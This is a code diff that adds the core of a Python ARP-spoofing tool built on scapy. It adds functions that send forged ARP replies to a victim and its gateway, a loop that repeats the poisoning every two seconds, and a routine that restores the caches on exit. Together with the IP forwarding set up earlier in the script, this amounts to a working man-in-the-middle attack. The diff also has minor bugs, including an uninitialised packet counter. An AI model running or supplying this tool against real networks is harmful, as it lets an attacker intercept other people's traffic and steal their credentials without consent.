@@ -1,10 +1,19 @@
 import sys, os, time
 import platform as platform_module
-from scapy.all import *
+import scapy.all as scapy
+from scapy.layers.l2 import getmacbyip as getMac
 
 interface = ""
 victimIP = ""
 gateIP = ""
+
+def spoofer(targetIP, spoofIP):
+    packet=scapy.ARP(op=2,pdst=targetIP,hwdst=getMac(targetIP),psrc=spoofIP)
+    scapy.send(packet, verbose=False)
+
+def restore(destinationIP, sourceIP):
+    packet = scapy.ARP(op=2,pdst=destinationIP,hwdst=getMac(destinationIP),psrc=sourceIP,hwsrc=getMac(sourceIP))
+    scapy.send(packet, count=4,verbose=False)
 
 def get_input():
 	try:
@@ -45,11 +54,25 @@ def main():
 			print("[!] Fatal Error: Could not enable IP Forwarding")
 			exit(1)
 	elif os == "Windows":
-		print("[!] Error Cannot enable IP forwarding\n[*] Open regedit and go to HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Para then modify the value of the parameter IPEnableRouter to 1\n[!] Exiting...\n")
+		print("[!] Error Cannot enable IP forwarding\n[*] Open regedit and go to HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters then modify the value of the parameter IPEnableRouter to 1\n[!] Exiting...\n")
 		exit(1)
 	else:
 		print("[!] Error unknown Operating System\n[*] MacOS is not supported\n[!] Exiting...\n")
 		exit(1)
+
+	try:
+		while True:
+			spoofer(victimIP,gateIP)
+			spoofer(gateIP,victimIP)
+			print("\r[+] Sent packets "+ str(packets)),
+			sys.stdout.flush()
+			packets +=2
+			time.sleep(2)
+	except KeyboardInterrupt:
+		print("\n\t[*] Exiting...")
+		restore(victimIP,gateIP)
+		restore(gateIP,victimIP)
+	
 
 if __name__ == "__main__":
 	if "--help" in sys.argv:
